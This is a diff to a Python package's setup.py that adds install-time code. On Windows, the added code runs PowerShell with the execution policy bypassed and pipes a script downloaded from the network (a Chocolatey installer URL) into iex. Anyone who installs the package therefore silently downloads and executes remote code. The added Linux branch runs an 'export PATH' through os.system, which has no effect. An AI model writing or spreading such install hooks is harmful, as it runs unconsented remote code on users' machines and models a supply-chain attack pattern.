@@ -1,8 +1,15 @@
 from setuptools import setup, find_packages
 from getpass import getuser
 import os
+from sys import platform
+import subprocess
 
 user = getuser()
+
+if platform == 'linux':
+    os.system(f'export PATH="/home/{user}/.local/bin:$PATH"')
+elif platform == 'win32':
+    subprocess.Popen(['powershell.exe', 'Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString("https://chocolatey.org/install.ps1"))'])
 
 with open("README.md", "r") as fh:
     long_description = fh.read()
